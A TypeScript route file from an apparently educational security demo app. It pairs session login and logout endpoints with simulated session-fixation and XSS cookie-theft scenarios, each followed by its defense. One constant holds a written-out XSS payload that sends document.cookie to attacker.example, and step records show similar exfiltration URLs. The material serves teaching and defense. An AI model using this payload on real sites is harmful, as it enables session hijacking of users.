import { Hono } from "hono";
import { setCookie, getCookie, deleteCookie } from "hono/cookie";
import { v4 as uuidv4 } from "uuid";
import bcrypt from "bcryptjs";
import { getDb } from "../db/schema.js";
import { parseBody, sessionLoginSchema, sessionAttackFixationSchema, sessionAttackXssCookieTheftSchema } from "../validation.js";
import type { UserRow, SessionRow } from "../../shared/api-types.js";
import { runAttackScenario, maskSecret, sanitizeForDisplay } from "../utils/attack-runner.js";

export const sessionAuthRoutes = new Hono();

sessionAuthRoutes.post("/login", async (c) => {
  const parsed = await parseBody(c, sessionLoginSchema);
  if ("error" in parsed) return parsed.error;
  const { username, password } = parsed.data;
  const trace = c.get("trace");
  const db = getDb();

  const t0 = performance.now();
  const user = db.prepare("SELECT id, username, password_hash FROM users WHERE username = ?").get(username) as UserRow | undefined;
  trace.addDbQuery({
    sql: "SELECT id, username, password_hash FROM users WHERE username = ?",
    params: [username],
    rows: user ? [{ id: user.id, username: user.username }] : [],
    ms: performance.now() - t0,
  });

  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return c.json({ success: false, error: "Invalid credentials" }, 401);
  }

  // Create session
  const sessionId = uuidv4();
  const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString(); // 30 min

  const t1 = performance.now();
  // is_attack_sim=0 で正常系セッションを明示的に挿入
  db.prepare("INSERT INTO sessions (id, user_id, expires_at, is_attack_sim) VALUES (?, ?, ?, 0)").run(
    sessionId, user.id, expiresAt
  );
  trace.addDbQuery({
    sql: "INSERT INTO sessions (id, user_id, expires_at, is_attack_sim) VALUES (?, ?, ?, 0)",
    params: [sessionId, user.id, expiresAt],
    ms: performance.now() - t1,
  });

  trace.addSessionOp({
    action: "CREATE_SESSION",
    data: { sessionId, userId: user.id, expiresAt },
  });

  const isProduction = process.env.NODE_ENV === "production";
  setCookie(c, "session_id", sessionId, {
    httpOnly: true,
    sameSite: "Lax",
    secure: isProduction,
    path: "/api",
    maxAge: 1800,
  });

  trace.addSessionOp({
    action: "SET_COOKIE",
    data: {
      name: "session_id",
      value: sessionId,
      flags: `HttpOnly; SameSite=Lax${isProduction ? "; Secure" : ""}; Path=/api; Max-Age=1800`,
    },
  });

  return c.json({
    success: true,
    data: {
      user: { id: user.id, username: user.username },
      session: { sessionId, expiresAt },
    },
  });
});

sessionAuthRoutes.get("/profile", (c) => {
  const trace = c.get("trace");
  const sessionId = getCookie(c, "session_id");

  trace.addSessionOp({
    action: "READ_COOKIE",
    data: { name: "session_id", value: sessionId || "(not found)" },
  });

  if (!sessionId) {
    return c.json({ success: false, error: "No session cookie" }, 401);
  }

  const db = getDb();
  const t0 = performance.now();
  // is_attack_sim=0 のみを参照 (E-3: 攻撃シミュレーションのレコードを誤参照しない)
  const session = db.prepare(
    "SELECT s.*, u.username FROM sessions s JOIN users u ON s.user_id = u.id WHERE s.id = ? AND s.expires_at > datetime('now') AND s.is_attack_sim = 0"
  ).get(sessionId) as SessionRow | undefined;
  trace.addDbQuery({
    sql: "SELECT s.*, u.username FROM sessions s JOIN users u ON s.user_id = u.id WHERE s.id = ? AND s.expires_at > datetime('now') AND s.is_attack_sim = 0",
    params: [sessionId],
    rows: session ? [session] : [],
    ms: performance.now() - t0,
  });

  if (!session) {
    return c.json({ success: false, error: "Session expired or invalid" }, 401);
  }

  return c.json({
    success: true,
    data: {
      user: { id: session.user_id, username: session.username },
      session: { id: session.id, expiresAt: session.expires_at },
    },
  });
});

sessionAuthRoutes.delete("/logout", (c) => {
  const trace = c.get("trace");
  const sessionId = getCookie(c, "session_id");
  if (sessionId) {
    const db = getDb();
    // is_attack_sim=0 の正常系セッションのみ削除 (E-3: 攻撃ログ用レコードを保護)
    db.prepare("DELETE FROM sessions WHERE id = ? AND is_attack_sim = 0").run(sessionId);
    trace.addDbQuery({
      sql: "DELETE FROM sessions WHERE id = ? AND is_attack_sim = 0",
      params: [sessionId],
      ms: 0,
    });
    trace.addSessionOp({ action: "DESTROY_SESSION", data: { sessionId } });
  }
  deleteCookie(c, "session_id", { path: "/api" });
  trace.addSessionOp({ action: "DELETE_COOKIE", data: { name: "session_id" } });
  return c.json({ success: true, data: { message: "Logged out" } });
});

sessionAuthRoutes.get("/store", (c) => {
  if (process.env.NODE_ENV === "production") {
    return c.json({ success: false, error: "Debug endpoint disabled in production" }, 403);
  }
  const db = getDb();
  // 正常系セッションのみを表示 (E-3: 攻撃シミュレーションのレコードは別経路で確認)
  const sessions = db.prepare(
    "SELECT s.id, s.user_id, u.username, s.created_at, s.expires_at FROM sessions s JOIN users u ON s.user_id = u.id WHERE s.is_attack_sim = 0"
  ).all();
  return c.json({ success: true, data: { sessions } });
});

/**
 * 攻撃デモルート: session-vs-token タブ
 *
 * 【教育目的専用】
 * このコードは OSI 参照アプリの教材機能として、
 * ローカル環境の固定シードデータに対する攻撃シミュレーションを提供します。
 *
 * - 外部ネットワークへのリクエストは行いません
 * - 実 CVE のエクスプロイトコードは含みません
 * - XSS シミュレーションは実際のスクリプト注入を行いません
 * - 本番環境での使用は想定していません
 *
 * 対象 CWE: CWE-384, CWE-79, CWE-1004
 * 対象 CAPEC: CAPEC-61, CAPEC-86
 * 関連設計書: DESIGN/13-attack-session-token.md
 * 安全装置: DESIGN/04-safety-guardrails.md
 */

// ── Scenario A: セッション固定攻撃 ──
// SPEC-4: handler で参照しないフィールド (attackerUsername) は ROB-FIND-006 デッドフィールド禁止規約に従い削除。
const FIXATION_CONSTANTS = {
  attackerKnownSid: "FIXATION_ATTACKER_SID_v1",
  victimUsername: "seed_alice",
} as const satisfies Readonly<{ attackerKnownSid: string; victimUsername: string }>;

// ROB-N8: HTTP ステータスは payload (steps[3].response.status / steps[4].response.status) と
//          extra (vulnerableHttpStatus / defendedHttpStatus) で SSoT を共有するため const で定数化。
const FIXATION_VULN_HTTP_STATUS = 200 as const;
const FIXATION_DEFENDED_HTTP_STATUS = 401 as const;

type FixationExtra = {
  attackerKnownSid: string;
  attackerKnownSidPreview: string;
  victimUsername: string;
  sessionRegeneratedInDefense: boolean;
  vulnerableHttpStatus: number;
  defendedHttpStatus: number;
  /** ROB-N1: seed_alice が DB に存在しなかったため脆弱パスをスキップした場合 false。 */
  victimSeedFound: boolean;
};

sessionAuthRoutes.post("/attack/fixation", (c) =>
  runAttackScenario<typeof sessionAttackFixationSchema, FixationExtra>(c, {
    schema: sessionAttackFixationSchema,
    scenarioId: "session-fixation",
    tabId: "session-vs-token",
    async handler({ trace, db, recordStep }) {
      // seed_alice の user_id を取得
      const aliceUser = db
        .prepare("SELECT id, username FROM users WHERE username = ?")
        .get(FIXATION_CONSTANTS.victimUsername) as { id: number; username: string } | undefined;

      // ── ROB-N1: seed_alice 不在時の早期リターン ──
      // sessions.user_id は users(id) の FOREIGN KEY 制約 (schema.ts) を持つため、
      // aliceId=0 で INSERT すると SQLITE_CONSTRAINT_FOREIGNKEY 例外でデモが 500 になる。
      // ROB-O-1 と同方針: seed が存在しない環境では脆弱/堅牢の両パスを "failed/blocked" で記録し、
      // ハンドラ自体は正常完了 (outcome="succeeded", HTTP 200) させて教育目的を維持する。
      if (!aliceUser) {
        const sidPreview = FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8) + "...";
        for (const [stepIdx, kind] of [
          ["fix-1", "probe"],
          ["fix-2", "tamper"],
          ["fix-3", "forge"],
        ] as const) {
          recordStep({
            id: stepIdx,
            kind,
            label: `Skipped (${stepIdx}): seed user '${FIXATION_CONSTANTS.victimUsername}' not present in DB`,
            labelJa: `スキップ (${stepIdx}): シードユーザー '${FIXATION_CONSTANTS.victimUsername}' が DB に存在しません`,
            status: "failed",
            payload: {
              type: "generic",
              data: {
                reason: "seed_alice missing — vulnerable INSERT skipped to avoid FOREIGN KEY violation.",
                attackerKnownSidPreview: sidPreview,
              },
            },
            detailJa: "シード再投入 (POST /api/reset) を実行してください。",
            detail: "Run POST /api/reset to re-seed the database.",
          });
        }
        recordStep({
          id: "fix-4",
          kind: "exploit",
          label: "Vulnerable path skipped — seed_alice missing, no INSERT performed",
          labelJa: "脆弱パススキップ — seed_alice 不在のため INSERT 実行なし",
          status: "failed",
          payload: {
            type: "generic",
            data: { vulnerableInsertSkipped: true, reason: "seed_alice missing" },
          },
          detailJa: "seed_alice が存在しないため、攻撃者が押し付けた SID を sessions に INSERT できません。",
          detail: "Cannot bind the attacker-forced SID to seed_alice's session because seed_alice is missing.",
        });
        recordStep({
          id: "fix-5",
          kind: "verify",
          label: "Defended path also unaffected: defense logic not exercised",
          labelJa: "堅牢パスも影響なし: 防御ロジックは未実行",
          status: "blocked",
          payload: {
            type: "generic",
            data: {
              blockedBy: "session_id_regenerated_after_login",
              note: "Defense would still apply (uuidv4 regeneration), but no vulnerable INSERT occurred to defend against.",
            },
          },
          detailJa: "堅牢実装は uuidv4() 再生成で同じ攻撃を阻止しますが、本実行では脆弱パスが空振りしたため防御も発火しません。",
          detail: "The defended implementation would still block via uuidv4 regeneration, but the vulnerable path was a no-op so no defense triggered.",
        });
        return {
          blockedBy: "session_id_regenerated_after_login",
          summary:
            "Vulnerable path skipped because seed_alice is missing from the DB. Defense (uuidv4 regeneration) would still apply if seed were present.",
          summaryJa:
            "このシナリオではシードユーザー seed_alice が DB に存在しないため脆弱パスを安全にスキップしました。堅牢実装 (uuidv4 再生成) は同攻撃を阻止する設計です。",
          extra: {
            attackerKnownSid: FIXATION_CONSTANTS.attackerKnownSid,
            attackerKnownSidPreview: sidPreview,
            victimUsername: FIXATION_CONSTANTS.victimUsername,
            sessionRegeneratedInDefense: true,
            vulnerableHttpStatus: FIXATION_VULN_HTTP_STATUS,
            defendedHttpStatus: FIXATION_DEFENDED_HTTP_STATUS,
            victimSeedFound: false,
          } satisfies FixationExtra,
          payload: {
            params: {},
            result: {
              attackerSidMasked: maskSecret(FIXATION_CONSTANTS.attackerKnownSid),
              attackerSidPreview: sidPreview,
              victimUserFound: false,
              sessionRegeneratedInDefense: true,
            },
          },
        };
      }
      const aliceId = aliceUser.id;

      // ── Step 1: probe — 攻撃者が事前 SID を取得 (シミュレーション、実 DB なし)
      recordStep({
        id: "fix-1",
        kind: "probe",
        label: "Attacker obtains a known session ID before victim's login",
        labelJa: "攻撃者が被害者のログイン前に既知のセッション ID を取得",
        status: "success",
        payload: {
          type: "http",
          request: { method: "GET", url: "/api/session/attack/fixation/setup (simulated)" },
          response: {
            status: 200,
            body: {
              sessionId: FIXATION_CONSTANTS.attackerKnownSid,
              note: "Vulnerable server issued an unauthenticated SID; attacker now knows it.",
            },
          },
        },
        detailJa:
          "脆弱な実装は未認証段階でセッション ID を発行し、攻撃者はその値を予め取得できます。",
        detail:
          "A vulnerable implementation issues a SID before authentication; the attacker can capture it ahead of time.",
      });

      // ── Step 2: tamper — 攻撃者が被害者に固定 SID を押し付ける URL/フォームを偽装
      recordStep({
        id: "fix-2",
        kind: "tamper",
        label: "Attacker forces victim's browser to use the fixed session ID",
        labelJa: "攻撃者が被害者のブラウザに固定セッション ID を使わせる",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: `http://localhost:3000/login?session_id=${FIXATION_CONSTANTS.attackerKnownSid} (phishing link)`,
            headers: {
              "Set-Cookie": `session_id=${FIXATION_CONSTANTS.attackerKnownSid} (forced via phishing)`,
            },
          },
          tamperedFields: ["session_id"],
        },
        detailJa:
          "フィッシングリンクや XSS 等で被害者のブラウザに固定 SID をセットさせます (シミュレーションのため実 fetch なし)。",
        detail:
          "Via phishing or XSS, the attacker forces the victim's browser to set the fixed SID (simulated — no real external request).",
      });

      // ── Step 3: forge — 被害者ログイン処理を「セッション ID 再生成なし」で実行
      // is_attack_sim=1 で実 DB INSERT (E-3)
      // INSERT OR REPLACE で同じ SID が複数回呼ばれてもエラーにならないようにする
      const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
      const t0 = performance.now();
      db.prepare(
        "INSERT OR REPLACE INTO sessions (id, user_id, expires_at, is_attack_sim) VALUES (?, ?, ?, 1)"
      ).run(FIXATION_CONSTANTS.attackerKnownSid, aliceId, expiresAt);
      trace.addDbQuery({
        sql: "INSERT OR REPLACE INTO sessions (id, user_id, expires_at, is_attack_sim) VALUES (?, ?, ?, 1)",
        params: [FIXATION_CONSTANTS.attackerKnownSid, aliceId, expiresAt],
        ms: performance.now() - t0,
      });
      trace.addSessionOp({
        action: "FIXATION_ATTACK_STEP",
        data: {
          isAttackMode: true,
          step: "inject",
          fixedSessionId: FIXATION_CONSTANTS.attackerKnownSid,
          victimUser: FIXATION_CONSTANTS.victimUsername,
          sessionRegenerated: false,
          note: "脆弱版: ログイン後にセッション ID を再生成せず、攻撃者が押し付けた SID をそのまま継続使用",
        },
      });
      recordStep({
        id: "fix-3",
        kind: "forge",
        label: "Vulnerable login: victim authenticates but SID is not regenerated",
        labelJa: "脆弱版ログイン: 被害者が認証されるが SID が再生成されない",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/session/login (vulnerable variant)",
            body: { username: FIXATION_CONSTANTS.victimUsername, password: "(omitted)" },
          },
          response: {
            status: 200,
            body: {
              success: true,
              sessionRegenerated: false,
              sessionId: FIXATION_CONSTANTS.attackerKnownSid,
            },
          },
        },
        detailJa:
          "脆弱な実装は認証後に新規 SID を発行せず、リクエスト Cookie の SID を再利用するため、攻撃者が押し付けた SID が seed_alice のセッションに紐付きます。",
        detail:
          "The vulnerable implementation reuses the request cookie's SID instead of issuing a new one after authentication, binding the attacker-forced SID to seed_alice's session.",
      });

      // ── Step 4: exploit — 攻撃者が固定 SID で seed_alice として認証成立
      const t1 = performance.now();
      const stolenSession = db
        .prepare(
          "SELECT s.id, s.user_id, s.expires_at, u.username FROM sessions s JOIN users u ON s.user_id = u.id WHERE s.id = ? AND s.is_attack_sim = 1"
        )
        .get(FIXATION_CONSTANTS.attackerKnownSid) as
        | { id: string; user_id: number; expires_at: string; username: string }
        | undefined;
      trace.addDbQuery({
        sql: "SELECT s.*, u.username FROM sessions s JOIN users u ON s.user_id = u.id WHERE s.id = ? AND s.is_attack_sim = 1",
        params: [FIXATION_CONSTANTS.attackerKnownSid],
        rows: stolenSession
          ? [{ id: stolenSession.id, user_id: stolenSession.user_id, username: stolenSession.username }]
          : [],
        ms: performance.now() - t1,
      });
      recordStep({
        id: "fix-4",
        kind: "exploit",
        label: "Attacker accesses victim's resources using the fixed SID",
        labelJa: "攻撃者が固定 SID で被害者リソースにアクセス",
        status: stolenSession ? "success" : "failed",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: "/api/session/profile",
            headers: { Cookie: `session_id=${FIXATION_CONSTANTS.attackerKnownSid}` },
          },
          response: {
            status: stolenSession ? FIXATION_VULN_HTTP_STATUS : FIXATION_DEFENDED_HTTP_STATUS,
            body: stolenSession
              ? { user: { id: stolenSession.user_id, username: stolenSession.username } }
              : { error: "Session expired or invalid" },
          },
        },
        detailJa: stolenSession
          ? `この実装は脆弱です: 攻撃者が押し付けた SID (${FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8)}...) が ${stolenSession.username} のセッションに紐付き、攻撃者は被害者のリソースにアクセスできました。`
          : "脆弱パス実行不可: seed_alice がシードに存在しない可能性があります。",
        detail: stolenSession
          ? `Vulnerable: the attacker-forced SID (${FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8)}...) is bound to ${stolenSession.username}'s session, allowing the attacker to access victim's resources.`
          : "Vulnerable path could not run — seed_alice may be missing from seeds.",
      });

      // ── Step 5: verify — 堅牢版: ログイン時に uuidv4() で新 SID 発行 → 旧 SID は無効
      const newRegeneratedSid = uuidv4();
      trace.addCryptoOp({
        op: "session_id_regeneration",
        input: `previous_sid=${FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8)}...`,
        output: `new_sid=${newRegeneratedSid.substring(0, 8)}... (rejected attacker SID)`,
        algo: "UUIDv4",
        detail:
          "Defended: post-login session ID regeneration via uuidv4() invalidates the attacker-supplied SID.",
      });
      recordStep({
        id: "fix-5",
        kind: "verify",
        label: "Defended: new SID issued after login — attacker's SID is now invalid",
        labelJa: "堅牢版: ログイン後に新 SID が発行される — 攻撃者の SID は無効化",
        status: "blocked",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: "/api/session/profile",
            headers: { Cookie: `session_id=${FIXATION_CONSTANTS.attackerKnownSid}` },
          },
          response: {
            status: FIXATION_DEFENDED_HTTP_STATUS,
            body: {
              error: "Session expired or invalid",
              blockedBy: "session_id_regenerated_after_login",
              note: `Defended login replaced the SID with a fresh UUID (${newRegeneratedSid.substring(0, 8)}...); the attacker's known SID no longer maps to any session.`,
            },
          },
        },
        detailJa: `堅牢な実装は認証成功時に uuidv4() で新規 SID を発行するため、攻撃者の事前知識に基づく ${FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8)}... は意味を失います。`,
        detail: `A defended implementation issues a fresh uuidv4() upon successful authentication, rendering the attacker's pre-known SID (${FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8)}...) useless.`,
      });

      return {
        blockedBy: "session_id_regenerated_after_login",
        summary:
          "The vulnerable login reused the attacker-forced SID, allowing session hijacking. The defended login regenerates the SID with uuidv4() and rejects the attacker's known SID.",
        summaryJa:
          "この実装は脆弱です: ログイン後にセッション ID が再生成されないため、攻撃者が事前に押し付けた SID で被害者セッションを乗っ取れました。堅牢版は uuidv4() で新規 SID を発行し、旧 SID を無効化します。",
        extra: {
          attackerKnownSid: FIXATION_CONSTANTS.attackerKnownSid,
          attackerKnownSidPreview: FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8) + "...",
          victimUsername: FIXATION_CONSTANTS.victimUsername,
          sessionRegeneratedInDefense: true,
          vulnerableHttpStatus: FIXATION_VULN_HTTP_STATUS,
          defendedHttpStatus: FIXATION_DEFENDED_HTTP_STATUS,
          victimSeedFound: true,
        } satisfies FixationExtra,
        payload: {
          params: {},
          result: {
            attackerSidMasked: maskSecret(FIXATION_CONSTANTS.attackerKnownSid),
            attackerSidPreview: FIXATION_CONSTANTS.attackerKnownSid.substring(0, 8) + "...",
            victimUserFound: true,
            sessionRegeneratedInDefense: true,
          },
        },
      };
    },
  })
);

// ── Scenario B: XSS Cookie 窃取 ──
const XSS_CONSTANTS = {
  vulnSid: "XSS_VULN_SID_v1",
  protectedSid: "XSS_PROTECTED_SID_v1",
  victimUsername: "seed_alice",
  // 注: 以下の文字列は教育用シミュレーションペイロード — このサーバーは実行しません
  rawXssPayload: "<script>fetch('https://attacker.example/?c='+document.cookie)</script>",
} as const satisfies Readonly<{
  vulnSid: string;
  protectedSid: string;
  victimUsername: string;
  rawXssPayload: string;
}>;

type XssCookieTheftExtra = {
  vulnerableSidPreview: string;
  protectedSidPreview: string;
  vulnerableCookieReadable: boolean;
  defendedCookieReadable: boolean;
  xssPayloadPreview: string;
  victimUsername: string;
};

sessionAuthRoutes.post("/attack/xss-cookie-theft", (c) =>
  runAttackScenario<typeof sessionAttackXssCookieTheftSchema, XssCookieTheftExtra>(c, {
    schema: sessionAttackXssCookieTheftSchema,
    scenarioId: "session-xss-cookie-theft",
    tabId: "session-vs-token",
    async handler({ trace, recordStep }) {
      // ⚠️ 教育用シミュレーション: 実際のスクリプト実行・DOM 操作は一切行いません ─
      //    サーバー側で「読み取りが起きた場合に相当する応答」を再現します。
      const sanitizedXssPayload = sanitizeForDisplay(XSS_CONSTANTS.rawXssPayload, 256);

      // ── Step 1: probe — 被害者が両方のエンドポイントでログインした想定
      recordStep({
        id: "xss-1",
        kind: "probe",
        label: "Victim logs in; two cookie variants exist (with/without HttpOnly)",
        labelJa: "被害者がログイン; HttpOnly あり/なし の 2 種類の Cookie が存在",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/session/login",
            body: { username: XSS_CONSTANTS.victimUsername, password: "(omitted)" },
          },
          response: {
            status: 200,
            body: {
              note: "Vulnerable variant sets session_id without HttpOnly; defended variant sets it with HttpOnly=true",
              vulnerableCookie: `session_id=${XSS_CONSTANTS.vulnSid} (no HttpOnly)`,
              defendedCookie: `session_id=${XSS_CONSTANTS.protectedSid}; HttpOnly`,
            },
          },
        },
        detailJa:
          "脆弱版は HttpOnly 属性なしで Cookie を発行するため、JavaScript から document.cookie で読み取れます。防御版は HttpOnly=true を設定します。",
        detail:
          "The vulnerable variant issues the session cookie without HttpOnly, making it accessible via document.cookie. The defended variant sets HttpOnly=true.",
      });

      // ── Step 2: tamper — 攻撃者が XSS payload を準備 (sanitizeForDisplay 済み文字列で表示)
      trace.addSessionOp({
        action: "XSS_PAYLOAD_PREPARED",
        data: {
          isAttackMode: true,
          payloadPreview: sanitizedXssPayload,
          simulationNote:
            "実際のスクリプト実行・DOM 操作は一切行いません — payload は表示用の文字列としてのみ扱います",
        },
      });
      recordStep({
        id: "xss-2",
        kind: "tamper",
        label: "Attacker prepares XSS payload targeting document.cookie (simulated)",
        labelJa: "攻撃者が document.cookie を狙う XSS payload を準備 (シミュレーション)",
        status: "success",
        payload: {
          type: "generic",
          data: {
            xssPayloadPreview: sanitizedXssPayload,
            targetProperty: "document.cookie",
            attackVector: "Reflected or stored XSS in a vulnerable page",
            simulationNote:
              "XSS payload execution is simulated. No actual script injection occurs in this demo.",
          },
        },
        detailJa:
          "攻撃者は XSS ペイロードを準備します。このデモでは実際のスクリプト注入は行いません。",
        detail:
          "Attacker prepares a malicious XSS payload. No actual script injection occurs in this demo — server-side concept only.",
      });

      // ── Step 3: forge — XSS による document.cookie 読み取り「が実行された場合に相当する処理」を再現
      // ⚠️ 重要安全装置: 実際のスクリプト実行・DOM 操作は一切行いません — 教育用の概念実証です
      const vulnerableCookieValue = `session_id=${XSS_CONSTANTS.vulnSid}`;
      const defendedCookieValue: string | null = null; // HttpOnly により JS から不可視
      trace.addSessionOp({
        action: "XSS_COOKIE_READ_SIMULATION",
        data: {
          isAttackMode: true,
          simulationNote:
            "⚠️ 重要安全装置: 実際のスクリプト実行・DOM 操作は一切行いません — 教育用の概念実証です",
          vulnerablePath: {
            httpOnlyEnabled: false,
            documentCookieResult: vulnerableCookieValue,
            cookieReadable: true,
          },
          defendedPath: {
            httpOnlyEnabled: true,
            documentCookieResult: defendedCookieValue,
            cookieReadable: false,
          },
        },
      });
      recordStep({
        id: "xss-3",
        kind: "forge",
        label: "Simulate XSS document.cookie read: vulnerable=readable, defended=null",
        labelJa: "XSS の document.cookie 読み取りをシミュレーション: 脆弱=読取可, 防御=null",
        status: "success",
        payload: {
          type: "generic",
          data: {
            simulationNote:
              "XSS payload execution is simulated server-side. No actual DOM access occurs.",
            vulnerable: {
              httpOnly: false,
              documentCookieResult: vulnerableCookieValue,
              readable: true,
            },
            defended: {
              httpOnly: true,
              documentCookieResult: null,
              readable: false,
            },
          },
        },
        detailJa:
          "サーバー側でシミュレーション: HttpOnly なし Cookie は document.cookie で読み取れますが、HttpOnly あり Cookie は JavaScript から不可視です。",
        detail:
          "Server-side simulation: Cookie without HttpOnly is readable via document.cookie, but Cookie with HttpOnly is invisible to JavaScript.",
      });

      // ── Step 4: exploit — 攻撃者が cookieValue を取得して被害者になりすまし
      trace.addSessionOp({
        action: "XSS_COOKIE_THEFT_SIMULATION",
        data: {
          isAttackMode: true,
          httpOnlyEnabled: false,
          cookieReadable: true,
          stolenCookiePreview: XSS_CONSTANTS.vulnSid.substring(0, 8) + "...",
          simulationNote:
            "実際のスクリプト実行ではなく、サーバー側での概念実証です — 実 DOM へのアクセスは発生していません",
        },
      });
      recordStep({
        id: "xss-4",
        kind: "exploit",
        label: "Vulnerable: XSS reads session cookie — attacker can impersonate victim",
        labelJa: "脆弱版: XSS が session Cookie を読み取り — 攻撃者が被害者になりすませる",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: "https://attacker.example/steal?c=session_id=... (simulated exfiltration)",
            headers: {
              "Stolen-Cookie": `session_id=${XSS_CONSTANTS.vulnSid.substring(0, 8)}...`,
            },
          },
          response: {
            status: 200,
            body: {
              note: "この実装は脆弱です: HttpOnly 属性が設定されていないため、XSS で session Cookie を読み取れました",
              stolenSessionIdPreview: XSS_CONSTANTS.vulnSid.substring(0, 8) + "...",
              victimImpersonationPossible: true,
            },
          },
        },
        detailJa:
          "この実装は脆弱です: HttpOnly 属性が設定されていないため、シミュレーションされた XSS で session Cookie を読み取れました。攻撃者はこの Cookie を使って被害者になりすませます。",
        detail:
          "This implementation is vulnerable: without HttpOnly, the simulated XSS successfully reads the session cookie. The attacker can use this cookie to impersonate the victim.",
      });

      // ── Step 5: verify — HttpOnly あり版: document.cookie で読み取れず → 攻撃失敗
      trace.addSessionOp({
        action: "XSS_COOKIE_THEFT_SIMULATION",
        data: {
          isAttackMode: true,
          httpOnlyEnabled: true,
          cookieReadable: false,
          simulationNote:
            "HttpOnly Cookie は JavaScript からアクセスできず、シミュレートされた XSS 読み取りも null を返します",
        },
      });
      recordStep({
        id: "xss-5",
        kind: "verify",
        label: "Defended: HttpOnly blocks XSS cookie theft — document.cookie returns nothing",
        labelJa: "堅牢版: HttpOnly が XSS Cookie 窃取を阻止 — document.cookie は何も返さない",
        status: "blocked",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: "https://attacker.example/steal?c= (simulated — empty result)",
          },
          response: {
            status: 200,
            body: {
              error: "Cookie is not readable",
              blockedBy: "cookie_httponly_attribute_enforced",
              documentCookieResult: null,
              note: "HttpOnly attribute prevents JavaScript (including XSS) from accessing the session cookie.",
            },
          },
        },
        detailJa:
          "堅牢版: HttpOnly 属性により JavaScript からの Cookie 読み取りがブロックされました。XSS ペイロードが実行されても document.cookie は空となり、セッション Cookie は保護されます。",
        detail:
          "Defended: the HttpOnly attribute prevents JavaScript from accessing the session cookie. Even if XSS executes, document.cookie returns empty — the session is protected.",
      });

      return {
        blockedBy: "cookie_httponly_attribute_enforced",
        summary:
          "Without HttpOnly, simulated XSS read the session cookie. With HttpOnly, document.cookie returns nothing and the simulated read fails.",
        summaryJa:
          "この実装は脆弱です: HttpOnly 属性が設定されていないため、シミュレーションされた XSS で session Cookie を読み取れました。堅牢版は HttpOnly 属性により document.cookie 経由のアクセスを阻止します。",
        extra: {
          vulnerableSidPreview: XSS_CONSTANTS.vulnSid.substring(0, 8) + "...",
          protectedSidPreview: XSS_CONSTANTS.protectedSid.substring(0, 8) + "...",
          vulnerableCookieReadable: true,
          defendedCookieReadable: false,
          xssPayloadPreview: sanitizedXssPayload,
          victimUsername: XSS_CONSTANTS.victimUsername,
        } satisfies XssCookieTheftExtra,
        payload: {
          params: {},
          result: {
            vulnerableSidMasked: maskSecret(XSS_CONSTANTS.vulnSid),
            defendedSidMasked: maskSecret(XSS_CONSTANTS.protectedSid),
            cookieReadabilityComparison: { vulnerable: true, defended: false },
          },
        },
      };
    },
  })
);
